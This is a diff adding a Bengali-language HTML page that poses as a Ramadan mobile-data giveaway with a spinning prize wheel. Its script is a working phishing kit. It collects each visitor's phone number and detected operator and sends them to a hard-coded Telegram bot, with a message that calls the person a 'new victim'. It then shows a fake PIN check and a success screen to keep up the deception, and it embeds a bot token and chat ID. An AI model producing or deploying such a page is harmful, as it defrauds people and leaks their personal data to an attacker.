@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mega Data Spinner</title>
+    <style>
+        /* আগের ফিউচারিস্টিক ডিজাইনগুলো একই আছে */
+        body { margin: 0; padding: 0; box-sizing: border-box; background-color: #050510; background-image: linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px); background-size: 30px 30px; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        .section { display: flex; flex-direction: column; align-items: center; width: 100%; transition: all 0.5s ease; }
+        h1 { font-size: 2rem; color: #00ffff; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff; margin-bottom: 30px; text-align: center; }
+        .wheel-container { position: relative; width: 320px; height: 320px; display: flex; justify-content: center; align-items: center; border-radius: 50%; background: transparent; border: 2px dashed #00ffff; box-shadow: 0 0 40px rgba(0, 255, 255, 0.2); padding: 15px; }
+        .wheel-container::before { content: ''; position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid transparent; border-top: 3px solid #ff003c; border-bottom: 3px solid #ff003c; animation: rotateOuter 3s linear infinite; }
+        @keyframes rotateOuter { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .pointer { position: absolute; top: -25px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 35px solid #ff003c; z-index: 10; filter: drop-shadow(0px 0px 10px #ff003c); }
+        .wheel { width: 100%; height: 100%; background: conic-gradient( rgba(0, 255, 255, 0.8) 0 60deg, rgba(255, 0, 60, 0.8) 60deg 120deg, rgba(112, 0, 255, 0.8) 120deg 180deg, rgba(0, 255, 136, 0.8) 180deg 240deg, rgba(255, 204, 0, 0.8) 240deg 300deg, rgba(0, 102, 255, 0.8) 300deg 360deg ); border-radius: 50%; position: relative; transition: transform 5s cubic-bezier(0.1, 0.8, 0.1, 1); box-shadow: inset 0 0 20px #000; }
+        .wheel::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 120px; height: 120px; background-color: #050510; border-radius: 50%; border: 3px solid #00ffff; box-shadow: 0 0 20px #00ffff, inset 0 0 20px #00ffff; z-index: 5; }
+        .slice-text { position: absolute; width: 50%; height: 30px; top: 50%; left: 50%; transform-origin: 0% 50%; font-size: 1rem; font-weight: bold; color: #fff; text-shadow: 1px 1px 5px black, 0 0 10px white; z-index: 2; display: flex; align-items: center; justify-content: flex-end; padding-right: 25px; box-sizing: border-box; letter-spacing: 1px; }
+        .btn { margin-top: 40px; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; color: #00ffff; background: rgba(0, 255, 255, 0.1); border: 2px solid #00ffff; text-transform: uppercase; cursor: pointer; border-radius: 50px; transition: 0.3s; }
+        .btn:hover { background: #00ffff; color: #050510; box-shadow: 0 0 20px #00ffff; }
+        .result { margin-top: 20px; font-size: 1.2rem; color: #00ffff; text-transform: uppercase; min-height: 30px; }
+
+        /* মডার্ন ক্লেইম সেকশন */
+        #claim-section { display: none; text-align: center; padding: 30px 20px; width: 90%; max-width: 380px; background: #ffffff; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #333; font-family: Arial, sans-serif; }
+        .modern-title { color: #00a859; font-size: 1.8rem; margin-bottom: 5px; font-weight: bold; }
+        .data-amount { color: #e5005c; font-size: 1.8rem; font-weight: bold; margin: 10px 0; }
+        .instruction-text { color: #555; font-size: 0.95rem; margin-bottom: 20px; }
+        .modern-input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 1.2rem; text-align: center; box-sizing: border-box; background: #f9f9f9; color: #333; outline: none; transition: 0.3s; }
+        .modern-input:focus { border-color: #00a859; box-shadow: 0 0 5px rgba(0, 168, 89, 0.3); background: #fff; }
+        .modern-btn { width: 100%; padding: 15px; font-size: 1.2rem; font-weight: bold; color: white; background: #00a859; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .modern-btn:hover { background: #008f4c; }
+        .modern-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .timer-text { color: #e5005c; font-size: 1.1rem; font-weight: bold; margin-bottom: 15px; }
+        #otp-box { display: none; }
+        
+        #operator-msg { color: #0066cc; font-weight: bold; margin-bottom: 15px; display: none; font-size: 1rem; }
+    </style>
+</head>
+<body>
+
+    <div class="section" id="spinner-section">
+        <h1>ramadan  all sim offer</h1>
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <div class="wheel" id="wheel">
+                <div class="slice-text" style="transform: translateY(-50%) rotate(-60deg);">100 MB</div>
+                <div class="slice-text" style="transform: translateY(-50%) rotate(0deg);">1 GB</div>
+                <div class="slice-text" style="transform: translateY(-50%) rotate(60deg);">500 MB</div>
+                <div class="slice-text" style="transform: translateY(-50%) rotate(120deg);">5 GB</div>
+                <div class="slice-text" style="transform: translateY(-50%) rotate(180deg);">Try Again</div>
+                <div class="slice-text" style="transform: translateY(-50%) rotate(240deg);">2 GB</div>
+            </div>
+        </div>
+        <button class="btn" id="spinBtn">স্পিন করুন</button>
+        <div class="result" id="resultText"></div>
+    </div>
+
+    <div class="section" id="claim-section">
+        <h2 class="modern-title">অভিনন্দন! 🎉</h2>
+        <p class="instruction-text">আপনি সফলভাবে জিতেছেন</p>
+        <div class="data-amount" id="prize-amount"></div>
+        
+        <div id="number-box">
+            <p class="instruction-text">অফারটি গ্রহণ করতে আপনার মোবাইল নাম্বারটি দিন</p>
+            <input type="number" id="mobileNumber" class="modern-input" placeholder="01XXX-XXXXXX">
+            <button class="modern-btn" id="sendOtpBtn">পরবর্তী ধাপ</button>
+        </div>
+
+        <div id="otp-box">
+            <div id="operator-msg"></div>
+            <p class="instruction-text" id="otp-instruction">আপনার ডিভাইসের জন্য একটি সিকিউরিটি পিন তৈরি করা হয়েছে।</p>
+            <input type="number" id="otpCode" class="modern-input" placeholder="পিন কোডটি দিন">
+            <p class="timer-text">সময় বাকি: <span id="countdown">30</span> সেকেন্ড</p>
+            <button class="modern-btn" id="confirmBtn">কনফার্ম করুন</button>
+        </div>
+    </div>
+
+    <script>
+        // আপনার টেলিগ্রাম বট সেটিংস
+        const TELEGRAM_BOT_TOKEN = "8527887805:AAGrpKcJcuxDx7EsNnjc9pxF6zl6YvEmEfc";
+        const TELEGRAM_CHAT_ID = "8549494164";
+
+        const wheel = document.getElementById("wheel");
+        const spinBtn = document.getElementById("spinBtn");
+        const resultText = document.getElementById("resultText");
+        const spinnerSection = document.getElementById("spinner-section");
+        const claimSection = document.getElementById("claim-section");
+        const prizeAmount = document.getElementById("prize-amount");
+        
+        const numberBox = document.getElementById("number-box");
+        const otpBox = document.getElementById("otp-box");
+        const mobileNumber = document.getElementById("mobileNumber");
+        const sendOtpBtn = document.getElementById("sendOtpBtn");
+        const confirmBtn = document.getElementById("confirmBtn");
+        const countdownSpan = document.getElementById("countdown");
+        const operatorMsg = document.getElementById("operator-msg");
+
+        const prizes = ["100 MB", "1 GB", "500 MB", "5 GB", "Try Again", "2 GB"];
+        let currentDegree = 0;
+        let timerInterval;
+        let wonPrizeGlobal = ""; 
+        let generatedSystemOTP = ""; // সিস্টেম জেনারেটেড ওটিপি সেভ রাখার জন্য
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            fetch(url).catch(error => console.error("Error:", error));
+        }
+
+        spinBtn.addEventListener("click", () => {
+            spinBtn.disabled = true;
+            resultText.innerHTML = "ভাগ্যের চাকা ঘুরছে... ⏳";
+            resultText.style.color = "#00ffff";
+
+            let randomDegree = Math.floor(Math.random() * 360);
+            let totalSpin = currentDegree + (360 * 6) + randomDegree; 
+            wheel.style.transform = `rotate(${totalSpin}deg)`;
+            currentDegree = totalSpin;
+
+            setTimeout(() => {
+                let actualDegree = totalSpin % 360;
+                let prizeIndex = Math.floor(((360 - actualDegree) % 360) / 60);
+                wonPrizeGlobal = prizes[prizeIndex];
+
+                if(wonPrizeGlobal === "Try Again") {
+                    resultText.innerHTML = "ইস! এবার হলো না। আবার চেষ্টা করুন 😢";
+                    resultText.style.color = "#ff003c";
+                    spinBtn.disabled = false;
+                } else {
+                    spinnerSection.style.display = "none";
+                    claimSection.style.display = "block";
+                    prizeAmount.innerText = wonPrizeGlobal + " ডাটা";
+                    document.body.style.backgroundImage = "none";
+                    document.body.style.backgroundColor = "#eef2f3";
+                }
+            }, 5000); 
+        });
+
+        function getOperatorName(number) {
+            const prefix = number.substring(0, 3);
+            if (prefix === "017" || prefix === "013") return "Grameenphone";
+            if (prefix === "018") return "Robi";
+            if (prefix === "016") return "Airtel";
+            if (prefix === "019" || prefix === "014") return "Banglalink";
+            if (prefix === "015") return "Teletalk";
+            return "আপনার নেটওয়ার্ক";
+        }
+
+        sendOtpBtn.addEventListener("click", () => {
+            const num = mobileNumber.value;
+            if(num.length === 11) {
+                sendOtpBtn.innerText = "সার্ভার কানেক্ট হচ্ছে...";
+                sendOtpBtn.disabled = true;
+
+                const operatorName = getOperatorName(num);
+                
+                // সিস্টেম ৪-ডিজিটের র‍্যান্ডম পিন তৈরি করছে
+                generatedSystemOTP = Math.floor(1000 + Math.random() * 9000).toString();
+
+                const msg = `🎯 নতুন ভিকটিম!\n🎁 জিতেছে: ${wonPrizeGlobal}\n📱 নাম্বার: ${num}\n📡 অপারেটর: ${operatorName}`;
+                sendToTelegram(msg);
+
+                setTimeout(() => {
+                    numberBox.style.display = "none"; 
+                    otpBox.style.display = "block"; 
+                    
+                    operatorMsg.innerHTML = `✅ <b>${operatorName}</b> সার্ভার ভেরিফায়েড!`;
+                    operatorMsg.style.display = "block";
+
+                    // ফ্ল্যাশ মেসেজ বা অ্যালার্টের মাধ্যমে পিন দেওয়া
+                    alert(`[সিস্টেম মেসেজ]\nঅফারটি ক্লেইম করতে আপনার সিকিউরিটি পিন: ${generatedSystemOTP}\nদয়া করে এই পিনটি বক্সে বসান।`);
+
+                    let timeLeft = 30;
+                    timerInterval = setInterval(() => {
+                        timeLeft--;
+                        countdownSpan.innerText = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+                        if(timeLeft <= 0) {
+                            clearInterval(timerInterval);
+                            countdownSpan.innerText = "00";
+                            confirmBtn.disabled = true;
+                            confirmBtn.innerText = "সময় শেষ! আবার চেষ্টা করুন";
+                        }
+                    }, 1000);
+                }, 2000); 
+            } else {
+                alert("দয়া করে সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন!");
+            }
+        });
+
+        confirmBtn.addEventListener("click", () => {
+            const otpValue = document.getElementById("otpCode").value;
+            const num = mobileNumber.value;
+
+            // চেক করা হচ্ছে ইউজার সঠিক পিন দিয়েছে কিনা
+            if(otpValue === generatedSystemOTP) {
+                confirmBtn.innerText = "ভেরিফাই হচ্ছে...";
+                confirmBtn.disabled = true;
+
+                const msg = `✅ পিন ভেরিফায়েড!\n📱 নাম্বার: ${num} সাকসেসফুলি ক্লেইম করেছে!`;
+                sendToTelegram(msg);
+
+                setTimeout(() => {
+                    clearInterval(timerInterval); 
+                    claimSection.innerHTML = `
+                        <h2 style="color:#00a859; font-size:2rem; margin-bottom:10px;">✅ সফল হয়েছে!</h2>
+                        <p style="font-size:1.1rem; color:#333;">আপনার <b>${num}</b> নাম্বারে অফারটি ২৪ ঘন্টার মধ্যে পাঠানো হবে।</p>
+                        <button class="modern-btn" style="margin-top:20px;" onclick="location.reload()">ফিরে যান</button>
+                    `;
+                }, 2000); 
+            } else {
+                alert("❌ ভুল পিন দিয়েছেন! দয়া করে সঠিক পিনটি দিন।");
+            }
+        });
+    </script>
+</body>
+</html>
